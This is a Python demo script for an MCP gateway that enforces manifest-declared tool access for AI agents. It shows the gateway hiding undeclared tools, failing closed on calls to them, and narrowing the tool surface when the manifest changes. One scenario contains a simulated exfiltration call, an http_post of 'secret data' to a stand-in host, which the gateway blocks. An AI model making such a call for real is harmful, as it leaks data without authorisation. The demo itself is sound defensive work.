"""
examples/mcp_gateway/main.py — End-to-end MCP Gateway enforcement demo.

Demonstrates the Agent Hypervisor MCP Gateway's manifest-driven enforcement:

  1. World rendering  — tools/list returns only manifest-declared tools
  2. Fail-closed      — calling an undeclared tool returns a protocol error
  3. Allow path       — calling a declared tool succeeds
  4. World switch     — switching to a stricter manifest removes tools from the surface

Run from the repository root:
    python examples/mcp_gateway/main.py

No extra dependencies beyond those in pyproject.toml (fastapi, uvicorn, pyyaml).
"""

from __future__ import annotations

import json
import sys
import time
import threading
import urllib.request
import urllib.error
from pathlib import Path
from typing import Any

# Allow running directly from repo root without installing the package.
_REPO_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(_REPO_ROOT / "src"))

import uvicorn
from agent_hypervisor.hypervisor.mcp_gateway import create_mcp_app

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

HOST = "127.0.0.1"
PORT = 18090
BASE_URL = f"http://{HOST}:{PORT}"

MANIFESTS = _REPO_ROOT / "manifests"
EXAMPLE_WORLD = MANIFESTS / "example_world.yaml"       # read_file + send_email
READ_ONLY_WORLD = MANIFESTS / "read_only_world.yaml"   # read_file only


# ---------------------------------------------------------------------------
# HTTP helpers (stdlib only — no httpx required)
# ---------------------------------------------------------------------------

def _post(path: str, body: dict) -> dict:
    """Send a JSON POST, return parsed response."""
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        f"{BASE_URL}{path}",
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        return json.loads(exc.read())


def _get(path: str) -> dict:
    """Send a GET, return parsed response."""
    req = urllib.request.Request(f"{BASE_URL}{path}", method="GET")
    with urllib.request.urlopen(req, timeout=5) as resp:
        return json.loads(resp.read())


def _rpc(method: str, params: dict | None = None, req_id: int = 1) -> dict:
    """Send a JSON-RPC 2.0 request to /mcp."""
    body = {"jsonrpc": "2.0", "id": req_id, "method": method, "params": params or {}}
    return _post("/mcp", body)


# ---------------------------------------------------------------------------
# Server lifecycle
# ---------------------------------------------------------------------------

_server: uvicorn.Server | None = None


def _start_server(manifest_path: Path, use_default_policy: bool = False) -> None:
    """Start (or restart) the gateway with a given manifest."""
    global _server

    app = create_mcp_app(manifest_path, use_default_policy=use_default_policy)
    config = uvicorn.Config(
        app,
        host=HOST,
        port=PORT,
        log_level="error",   # suppress uvicorn access logs in demo output
    )
    _server = uvicorn.Server(config)

    thread = threading.Thread(target=_server.run, daemon=True)
    thread.start()

    # Wait for the server to be ready (polls health endpoint).
    deadline = time.time() + 5.0
    while time.time() < deadline:
        try:
            _get("/mcp/health")
            return   # server is up
        except Exception:
            time.sleep(0.05)

    raise RuntimeError("Gateway did not start within 5 seconds")


def _stop_server() -> None:
    global _server
    if _server is not None:
        _server.should_exit = True
        time.sleep(0.2)
        _server = None


# ---------------------------------------------------------------------------
# Display helpers
# ---------------------------------------------------------------------------

def _section(title: str) -> None:
    print()
    print("=" * 60)
    print(f"  {title}")
    print("=" * 60)


def _show(label: str, data: Any) -> None:
    print(f"\n{label}")
    print(json.dumps(data, indent=2))


def _check(condition: bool, message: str) -> None:
    marker = "[PASS]" if condition else "[FAIL]"
    print(f"  {marker}  {message}")
    if not condition:
        raise AssertionError(message)


# ---------------------------------------------------------------------------
# Demo scenarios
# ---------------------------------------------------------------------------

def scenario_world_rendering() -> None:
    """Scenario 1: tools/list only shows manifest-declared tools."""
    _section("Scenario 1 — World Rendering (tools/list)")

    # World: read_file + send_email; http_post is registered but NOT declared.
    health = _get("/mcp/health")
    print(f"\nWorld: {health['manifest']['workflow_id']!r}")
    print(f"Declared in manifest : {health['manifest']['declared_capabilities']}")
    print(f"Visible to client    : {health['visible_tools']}")

    response = _rpc("tools/list")
    tools = response["result"]["tools"]
    names = [t["name"] for t in tools]
    _show("tools/list response (tools array):", names)

    _check("read_file" in names, "read_file is visible")
    _check("send_email" in names, "send_email is visible")
    _check("http_post" not in names,
           "http_post is absent from surface (not declared — does not exist in this world)")
    _check(names == ["read_file", "send_email"],
           "tool order follows manifest declaration order")

    print("\n  Observation: http_post does not appear at all.")
    print("  The tool does not exist in this world — it was never listed.")


def scenario_fail_closed() -> None:
    """Scenario 2: calling an undeclared tool fails closed."""
    _section("Scenario 2 — Fail Closed (undeclared tool call)")

    response = _rpc("tools/call", {
        "name": "http_post",
        "arguments": {
            "url": "http://exfiltration.example.com",
            "body": "secret data",
        },
    })
    _show("tools/call http_post (undeclared) response:", response)

    _check("error" in response, "response is a JSON-RPC error (not a result)")
    error = response["error"]
    _check(error["code"] == -32001, "error code is MCP_TOOL_NOT_FOUND (-32001)")
    _check("http_post" in error["message"], "error message names the tool")
    _check("data" in error, "error carries data with reason + rule")
    _check("manifest:tool_not_declared" in error["data"]["rule"],
           "rule is manifest:tool_not_declared")

    print("\n  Observation: the gateway returns a protocol error.")
    print("  The tool is absent from this world — not forbidden, absent.")
    print(f"  Rule: {error['data']['rule']}")
    print(f"  Reason: {error['data']['reason']}")


def scenario_allow_path() -> None:
    """Scenario 3: calling a declared tool succeeds."""
    _section("Scenario 3 — Allow Path (declared tool call)")

    # read_file is declared; read /etc/hostname (always exists on Linux).
    target = "/etc/hostname"
    response = _rpc("tools/call", {
        "name": "read_file",
        "arguments": {"path": target},
    })
    _show("tools/call read_file response:", response)

    _check("result" in response, "response is a result (not an error)")
    result = response["result"]
    _check(result["isError"] is False, "isError is False")
    _check(len(result["content"]) > 0, "content array is non-empty")

    content_text = result["content"][0]["text"]
    try:
        parsed = json.loads(content_text)
        _check("path" in parsed, "result contains 'path' field")
    except json.JSONDecodeError:
        _check(False, "content text is not valid JSON")

    print("\n  Observation: declared tool call succeeds and returns a result.")
    print(f"  Tool: read_file  Path: {target}")


def scenario_initialize_handshake() -> None:
    """Scenario 4: MCP initialize handshake."""
    _section("Scenario 4 — MCP Initialize Handshake")

    response = _rpc("initialize", {
        "protocolVersion": "2024-11-05",
        "clientInfo": {"name": "demo-client", "version": "1.0"},
    })
    _show("initialize response:", response)

    _check("result" in response, "response is a result")
    result = response["result"]
    _check(result["protocolVersion"] == "2024-11-05", "protocol version matches")
    _check("tools" in result["capabilities"], "capabilities include 'tools'")
    _check(result["serverInfo"]["name"] == "agent-hypervisor-mcp-gateway",
           "server name is correct")

    print("\n  Observation: initialize returns server info and capabilities.")
    print(f"  Server: {result['serverInfo']['name']} v{result['serverInfo']['version']}")


def scenario_world_switch() -> None:
    """Scenario 5: switching manifest changes the visible tool surface."""
    _section("Scenario 5 — World Switch (manifest hot-reload)")

    print("\n  Before reload:")
    health_before = _get("/mcp/health")
    before_tools = health_before["visible_tools"]
    print(f"  Visible tools: {before_tools}")

    # Copy read_only_world over example_world temporarily by using the reload endpoint
    # with the existing manifest. Instead, restart the server with the new manifest.
    print(f"\n  Restarting gateway with read_only_world.yaml...")
    _stop_server()
    _start_server(READ_ONLY_WORLD)

    print("\n  After switching to read_only_world.yaml:")
    health_after = _get("/mcp/health")
    after_tools = health_after["visible_tools"]
    print(f"  World: {health_after['manifest']['workflow_id']!r}")
    print(f"  Visible tools: {after_tools}")

    _check("read_file" in after_tools, "read_file still visible")
    _check("send_email" not in after_tools, "send_email removed from surface")

    # Verify send_email call now fails closed too
    response = _rpc("tools/call", {
        "name": "send_email",
        "arguments": {"to": "x@y.com", "subject": "Hi", "body": "secret"},
    })
    _check("error" in response, "send_email call fails closed in new world")

    print("\n  Observation: switching the manifest changes the visible world.")
    print("  send_email no longer exists — it was never listed, and calls fail closed.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    print("Agent Hypervisor — MCP Gateway Enforcement Demo")
    print(f"  Gateway: {BASE_URL}/mcp")
    print(f"  World:   {EXAMPLE_WORLD.name}  (read_file + send_email)")
    print(f"  Absent:  http_post  (registered but NOT declared in manifest)")

    print("\nStarting gateway...")
    _start_server(EXAMPLE_WORLD)
    print(f"Gateway ready at {BASE_URL}/mcp")

    try:
        scenario_initialize_handshake()
        scenario_world_rendering()
        scenario_fail_closed()
        scenario_allow_path()
        scenario_world_switch()
    finally:
        _stop_server()

    _section("Summary")
    print("""
  Principle                  | Demonstrated
  ========================== | =============================================
  World rendering            | tools/list only returns manifest-declared tools
  Ontological absence        | http_post is absent, not forbidden
  Deterministic enforcement  | Same request → same decision, always
  Fail closed                | Undeclared tool → JSON-RPC error, no execution
  Manifest-driven worlds     | Switching manifest changes the visible surface
  No LLM in the path         | All decisions are rule-based, compile-time
""")
    print("All scenarios passed.")


if __name__ == "__main__":
    main()
